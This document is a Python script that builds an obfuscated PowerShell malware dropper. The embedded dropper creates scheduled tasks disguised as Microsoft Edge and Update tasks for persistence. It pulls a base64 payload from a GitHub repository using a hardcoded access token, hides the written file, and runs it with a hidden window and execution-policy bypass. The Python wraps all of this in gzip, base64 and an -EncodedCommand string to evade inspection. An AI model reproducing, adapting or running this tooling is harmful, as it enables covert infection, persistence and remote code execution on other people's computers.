import gzip
import base64

# Minified dropper script
minified_dropper_script = r'''
$sp = "$env:TEMP\\7ee6d56d-based-8c10-7546-513b6c6aa924.ps1"
if (Test-Path $sp) {
    $r = Invoke-WebRequest -Uri 'https://api.github.com/repos/<repos_here>' -Headers @{'Authorization'='Bearer <token>'}
    $j = $r.Content | ConvertFrom-Json
    $d = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($j.content))
    $L="$env:TEMP\\chrome.ps1";[System.IO.File]::WriteAllText($L,$d)
    attrib +h +r $L
    if(Test-Path $L){
    powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP\chrome.ps1
    }
}else {
    schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP/7ee6d56d-based-8c10-7546-513b6c6aa924.ps1" /sc minute /mo 30 /f
    $T="lMsnK3BxyGI22Fku0";$R="Akeame014k9dam2491-49fj13mafkeavAsgkiaKSe049as";$O="HKenzoKimura"
    $H=@{"Authorization"="Bearer $T";"Accept"="application/vnd.github+json";"X-GitHub-Api-Version"="2022-11-28"}
    $P="Scripts/droo.ps1";$U="https://api.github.com/repos/$O/$R/contents/$P";
    $R=Invoke-RestMethod -Uri $U -Headers $H
    $E=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($R.content))
    $L="$env:TEMP\7ee6d56d-based-8c10-7546-513b6c6aa924.ps1";[System.IO.File]::WriteAllText($L,$E)
    schtasks /create /tn "MicrosoftUpdatedTaskWeb" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP/7ee6d56d-based-8c10-7546-513b6c6aa924.ps1" /sc once /st 14:00 /f
    attrib +h +r $L
    }
'''



# Compress and encode the minified script
compressed = gzip.compress(minified_dropper_script.encode('utf-8'))
encoded = base64.b64encode(compressed).decode('utf-8')

# Generate PowerShell decoder script
powershell_decoder = f"""
$base64 = '{encoded}'
$bytes = [System.Convert]::FromBase64String($base64)
$stream = New-Object IO.MemoryStream(, $bytes)
$gzip = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress)
$reader = New-Object IO.StreamReader($gzip)
$command = $reader.ReadToEnd()
iex $command
"""

# Encode in UTF-16LE for use with -EncodedCommand
utf16_bytes = powershell_decoder.encode('utf-16le')
encoded_command = base64.b64encode(utf16_bytes).decode('utf-8')

# Save scripts
with open("dropper_minified.ps1", "w", encoding="utf-8") as f:
    f.write(powershell_decoder)

with open("encoded_command_minified.txt", "w", encoding="utf-8") as f:
    f.write(encoded_command)

print("Scripts 'dropper_minified.ps1' e 'encoded_command_minified.txt' gerados com sucesso.")
